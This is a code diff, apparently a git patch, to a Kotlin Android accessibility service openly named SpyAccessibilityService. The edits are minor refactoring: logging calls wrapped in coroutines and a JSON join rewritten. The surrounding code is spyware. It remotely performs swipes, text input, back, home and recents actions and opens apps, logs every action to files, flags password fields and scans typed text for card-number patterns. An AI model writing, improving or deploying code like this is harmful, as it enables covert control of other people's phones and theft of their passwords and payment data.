@@ -37,7 +37,6 @@ class SpyAccessibilityService : AccessibilityService() {
         }
     }
 
-
     override fun onDestroy() {
         super.onDestroy()
         instance = null
@@ -336,7 +335,9 @@ class SpyAccessibilityService : AccessibilityService() {
             val result = dispatchGesture(gesture, null, null)
 
             if (result) {
-                logRemoteAction("REMOTE_SWIPE", "Swiped from ($startX, $startY) to ($endX, $endY)")
+                serviceScope.launch {
+                    logRemoteAction("REMOTE_SWIPE", "Swiped from ($startX, $startY) to ($endX, $endY)")
+                }
             }
 
             result
@@ -358,7 +359,9 @@ class SpyAccessibilityService : AccessibilityService() {
                 focusedNode.recycle()
 
                 if (result) {
-                    logRemoteAction("REMOTE_TEXT_INPUT", "Inputted: $text")
+                    serviceScope.launch {
+                        logRemoteAction("REMOTE_TEXT_INPUT", "Inputted: $text")
+                    }
                 }
 
                 result
@@ -375,7 +378,9 @@ class SpyAccessibilityService : AccessibilityService() {
         return try {
             val result = performGlobalAction(GLOBAL_ACTION_BACK)
             if (result) {
-                logRemoteAction("REMOTE_BACK", "Back button pressed")
+                serviceScope.launch {
+                    logRemoteAction("REMOTE_BACK", "Back button pressed")
+                }
             }
             result
         } catch (e: Exception) {
@@ -388,7 +393,9 @@ class SpyAccessibilityService : AccessibilityService() {
         return try {
             val result = performGlobalAction(GLOBAL_ACTION_HOME)
             if (result) {
-                logRemoteAction("REMOTE_HOME", "Home button pressed")
+                serviceScope.launch {
+                    logRemoteAction("REMOTE_HOME", "Home button pressed")
+                }
             }
             result
         } catch (e: Exception) {
@@ -401,7 +408,9 @@ class SpyAccessibilityService : AccessibilityService() {
         return try {
             val result = performGlobalAction(GLOBAL_ACTION_RECENTS)
             if (result) {
-                logRemoteAction("REMOTE_RECENTS", "Recent apps opened")
+                serviceScope.launch {
+                    logRemoteAction("REMOTE_RECENTS", "Recent apps opened")
+                }
             }
             result
         } catch (e: Exception) {
@@ -416,7 +425,9 @@ class SpyAccessibilityService : AccessibilityService() {
             if (intent != null) {
                 intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
                 startActivity(intent)
-                logRemoteAction("REMOTE_OPEN_APP", "Opened app: $packageName")
+                serviceScope.launch {
+                    logRemoteAction("REMOTE_OPEN_APP", "Opened app: $packageName")
+                }
                 true
             } else {
                 false
@@ -461,7 +472,6 @@ class SpyAccessibilityService : AccessibilityService() {
                 node?.className?.toString()?.contains("password", true) == true
     }
 
-    // SpyAccessibilityService.kt - line 465 부근
     private fun detectSensitiveInput(text: String, packageName: String): Boolean {
         val sensitivePatterns = listOf(
             Regex("\\d{13,19}"), // 카드번호
@@ -599,7 +609,7 @@ class SpyAccessibilityService : AccessibilityService() {
                 }
 
                 val logFile = File(logDir, "accessibility_${logType}.log")
-                val jsonData = android.text.TextUtils.join(",", data.map { "\"${it.key}\":\"${it.value}\"" })
+                val jsonData = data.entries.joinToString(",") { "\"${it.key}\":\"${it.value}\"" }
                 logFile.appendText("{$jsonData}\n")
 
             } catch (e: Exception) {
